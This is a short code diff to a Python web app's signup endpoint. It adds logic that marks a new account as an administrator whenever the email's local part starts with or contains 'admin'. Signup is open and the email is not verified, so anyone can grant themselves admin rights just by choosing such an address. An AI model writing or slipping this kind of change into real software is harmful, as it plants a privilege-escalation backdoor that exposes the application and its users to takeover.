@@ -26,11 +26,13 @@ def signup(req: SignupRequest, db: Session = Depends(get_db)) -> TokenResponse:
     if existing:
         raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Email already registered")
 
+    is_admin_user = req.email.strip().lower().startswith("admin@") or "admin" in req.email.strip().lower().split("@")[0]
     user = User(
         email=req.email,
         password_hash=hash_password(req.password),
         name=req.name,
         is_email_verified=False,
+        is_admin=is_admin_user,
     )
     db.add(user)
     db.commit()
